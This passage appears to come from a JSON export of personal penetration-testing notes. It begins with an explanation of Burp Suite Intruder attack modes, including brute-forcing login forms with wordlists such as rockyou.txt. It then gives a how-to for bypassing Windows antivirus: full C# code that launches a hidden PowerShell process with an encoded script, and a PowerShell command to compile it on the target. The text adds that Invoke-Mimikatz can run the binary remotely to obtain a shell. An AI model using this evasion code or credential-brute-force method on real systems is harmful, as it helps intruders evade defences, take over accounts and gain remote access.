reference.&lt;/p&gt;\n&lt;h2 id=&quot;intruder&quot;&gt;Intruder&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#intruder&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=&quot;sniper&quot;&gt;Sniper&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#sniper&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Sniper takes a &lt;em&gt;single&lt;/em&gt; word list and inserts each element into each defined position, one element and one position at a time.&lt;/p&gt;\n&lt;p&gt;For example, assume a three-element word list containing &lt;code&gt;one&lt;/code&gt;, &lt;code&gt;two&lt;/code&gt;, and &lt;code&gt;three&lt;/code&gt;, and the body date &lt;code&gt;foo=position1&amp;#x26;bar=position2&lt;/code&gt;. Then if &lt;code&gt;position1&lt;/code&gt; and &lt;code&gt;position2&lt;/code&gt; are both defined as positions, Sniper will produce the following sequence of attempts:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;foo=one&amp;#x26;bar=position2&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=two&amp;#x26;bar=position2&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=three&amp;#x26;bar=position2&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=position1&amp;#x26;bar=one&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=position1&amp;#x26;bar=two&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=position1&amp;#x26;bar=three&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Sniper is most useful when attacking a &lt;em&gt;single&lt;/em&gt; position, however.&lt;/p&gt;\n&lt;h3 id=&quot;battering-ram&quot;&gt;Battering ram&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#battering-ram&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Battering Ram again takes a &lt;em&gt;single&lt;/em&gt; word list, but then inserts the &lt;em&gt;same&lt;/em&gt; payload into &lt;em&gt;every&lt;/em&gt; position on each run.&lt;/p&gt;\n&lt;p&gt;For example, assume a three-element word list containing &lt;code&gt;one&lt;/code&gt;, &lt;code&gt;two&lt;/code&gt;, and &lt;code&gt;three&lt;/code&gt;, and the body date &lt;code&gt;foo=position1&amp;#x26;bar=position2&lt;/code&gt;. Then if &lt;code&gt;position1&lt;/code&gt; and &lt;code&gt;position2&lt;/code&gt; are both defined as positions, Battering Ram will produce the following sequence of attempts:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;foo=one&amp;#x26;bar=one&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=two&amp;#x26;bar=two&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=three&amp;#x26;bar=three&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;It’s a little mysterious to me why this attack is useful.&lt;/p&gt;\n&lt;h3 id=&quot;pitchfork&quot;&gt;Pitchfork&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#pitchfork&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Pitchfork takes &lt;em&gt;one word list per position&lt;/em&gt;, and then iterates through them in sequence (thus all word lists need to be the same length; if the lists are of different lengths, then Pitchfork will stop upon reaching the end of the &lt;em&gt;shortest&lt;/em&gt; list).&lt;/p&gt;\n&lt;p&gt;For example, assume one three-element word list containing &lt;code&gt;one&lt;/code&gt;, &lt;code&gt;two&lt;/code&gt;, and &lt;code&gt;three&lt;/code&gt;, a second three-element word list containing &lt;code&gt;alpha&lt;/code&gt;, &lt;code&gt;beta&lt;/code&gt;, and &lt;code&gt;gamma&lt;/code&gt;, and the body date &lt;code&gt;foo=position1&amp;#x26;bar=position2&lt;/code&gt;. Then if &lt;code&gt;position1&lt;/code&gt; and &lt;code&gt;position2&lt;/code&gt; are both defined as positions, Pitchfork will produce the following sequence of attempts:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;foo=one&amp;#x26;bar=alpha&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=two&amp;#x26;bar=beta&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=three&amp;#x26;bar=gamma&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;This is generally the approach that would be used in order to test against a potential list of username/password tuples.&lt;/p&gt;\n&lt;h3 id=&quot;cluster-bomb&quot;&gt;Cluster bomb&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#cluster-bomb&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Cluster Bomb takes &lt;em&gt;one word list per position&lt;/em&gt;, and then tests every possible combination in sequence.&lt;/p&gt;\n&lt;p&gt;For example, assume one three-element word list containing &lt;code&gt;one&lt;/code&gt;, &lt;code&gt;two&lt;/code&gt;, and &lt;code&gt;three&lt;/code&gt;, a second three-element word list containing &lt;code&gt;alpha&lt;/code&gt;, &lt;code&gt;beta&lt;/code&gt;, and &lt;code&gt;gamma&lt;/code&gt;, and the body date &lt;code&gt;foo=position1&amp;#x26;bar=position2&lt;/code&gt;. Then if &lt;code&gt;position1&lt;/code&gt; and &lt;code&gt;position2&lt;/code&gt; are both defined as positions, Cluster Bomb will produce the following sequence of attempts:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;foo=one&amp;#x26;bar=alpha&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=one&amp;#x26;bar=beta&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=one&amp;#x26;bar=gamma&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=two&amp;#x26;bar=alpha&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=two&amp;#x26;bar=beta&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=two&amp;#x26;bar=gamma&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=three&amp;#x26;bar=alpha&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=three&amp;#x26;bar=beta&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;foo=three&amp;#x26;bar=gamma&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;This is a good approach for attacking login forms if you &lt;em&gt;don’t&lt;/em&gt; already know the actual credentials, but want to fuzz using some set of likely values (like rockyou.txt).&lt;/p&gt;\n&lt;p&gt;Obviously this is the most expensive attack in terms of connections/time, and thus also the one most likely to get you noticed!&lt;/p&gt;\n&lt;h2 id=&quot;decoder&quot;&gt;Decoder&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#decoder&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The Burp Suite Decoder displays hashes in the “Hex” view by default; to convert them into the (hex) ASCII string you’re used to, encode this output as “ASCII Hex”.&lt;/p&gt;\n&lt;h2 id=&quot;macros&quot;&gt;Macros&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#macros&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;When dealing with forms that include session cookies or anti-CSRF tokens, we can either grab these tokens directly in Intruder using the Recursive Grep function (within the Intruder module), or construct a macro in &lt;strong&gt;Project options → Sessions → Macros&lt;/strong&gt; (necessary if there’s, for example, a random redirect to make our life harder).&lt;/p&gt;\n&lt;p&gt;Basically, macros just define repeated requests that we can make. Once a request is defined here, we can add an entry in Session Handling Rules and define the Scope of the macro (the tools it’s active in and the URL it applies to). Then in details we can trigger the macro. Generally you’ll want to restrict the URLs the macro applies to and what parameters/cookies get updated by the macro as much as possible.&lt;/p&gt;"},"spells/Bypass-Windows-antivirus-with-C-Sharp":{"slug":"spells/Bypass-Windows-antivirus-with-C-Sharp","filePath":"spells/Bypass Windows antivirus with C Sharp.md","title":"Bypass Windows antivirus with C#","links":["spells/Invoke-Mimikatz"],"tags":["HowTo","AttackCycle/AntiForensics","OS/Windows","Application/PowerShell","Application/PowerShell/Invoke-Mimikatz"],"content":"C# can be used to bypass AV (at least as of September 2022) — just create a C# wrapper that fires up a PowerShell one-liner. (Sometimes this will need to be modified slightly to bypass AV, but generally you don’t have to tweak this code much — C# analysis doesn’t seem to be particularly robust for most AV products.)\nusing System;\nnamespace Game\n{\n\tpublic class Program\n\t{\n\t\tpublic static void Main() {\n\t\t\tSystem.Diagnostics.Process P = new System.Diagnostics.Process();\n\t\t\tSystem.Diagnostics.ProcessStartInfo SI = new System.Diagnostics.ProcessStartInfo();\n\t\t\tSI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n\t\t\tSI.FileName = &quot;powershell.exe&quot;;\n\t\t\tSI.Arguments = &quot;-enc $BASE64_ENCODED_SCRIPT_TO_RUN&quot;;\n\t\t\tP.StartInfo = SI;\n\t\t\tP.Start();\n\t\t}\n\t}\n}\nThis can be compiled using PowerShell — perhaps even on the target itself. What’s the advantage to doing this? You can use Invoke-Mimikatz to run this binary remotely to quickly obtain a remote shell with the permissions of the user you’re impersonating.\n$code = @&quot;\nusing System;\nnamespace Game\n{\n\tpublic class Program\n\t{\n\t\tpublic static void Main() {\n\t\t\tSystem.Diagnostics.Process P = new System.Diagnostics.Process();\n\t\t\tSystem.Diagnostics.ProcessStartInfo SI = new System.Diagnostics.ProcessStartInfo();\n\t\t\tSI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n\t\t\tSI.FileName = &quot;powershell.exe&quot;;\n\t\t\tSI.Arguments = &quot;-enc $BASE64_ENCODED_SCRIPT_TO_RUN&quot;;\n\t\t\tP.StartInfo = SI;\n\t\t\tP.Start();\n\t\t}\n\t}\n}\n&quot;@\nAdd-Type -outputtype consoleapplication -outputassembly $BINARY_NAME -TypeDefinition $code -Language CSharp","richContent":"&lt;p&gt;C# can be used to bypass AV (at least as of September 2022) — just create a C# wrapper that fires up a PowerShell one-liner. (Sometimes this will need to be modified slightly to bypass AV, but generally you don’t have to tweak this code much — C# analysis doesn’t seem to be particularly robust for most AV products.)&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;csharp&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;csharp&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;using&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt; System&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;namespace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt; Game&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\tpublic&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; class&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt; Program&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t{&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\t\tpublic&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; static&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; void&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; Main&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;\t\t\tSystem&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;Diagnostics&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;Process&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; P&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; new&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt; System&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;Diagnostics&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;Process&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;();&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;\t\t\tSystem&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;Diagnostics&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;ProcessStartInfo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; SI&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; new&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt; System&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;Diagnostics&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2E8F82;--shiki-dark:#5DA994&quot;&gt;ProcessStartInfo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;();&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t\t\tSI&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;WindowStyle&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; System&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;Diagnostics&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;ProcessWindowStyle&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;Hidden&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t\t\tSI&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;FileName&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;powershell.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t\t\tSI&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;Arguments&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-enc $BASE64_ENCODED_SCRIPT_TO_RUN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t\t\tP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;StartInfo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; SI&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t\t\tP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;Start&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;();&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t\t}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This can be compiled using PowerShell — perhaps even on the target itself. What’s the advantage to doing this? You can use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Invoke-Mimikatz&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Invoke-Mimikatz&quot;&gt;Invoke-Mimikatz&lt;/a&gt; to run this binary remotely to quickly obtain a remote shell with the permissions of the user you’re impersonating.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;code&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; @&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;using System;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;namespace Game&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;{&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tpublic class Program&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t{&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t\tpublic static void Main() {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t\t\tSystem.Diagnostics.Process P = new System.Diagnostics.Process();&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t\t\tSystem.Diagnostics.ProcessStartInfo SI = new System.Diagnostics.ProcessStartInfo();&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t\t\tSI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t\t\tSI.FileName = &quot;powershell.exe&quot;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t\t\tSI.Arguments = &quot;-enc &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span 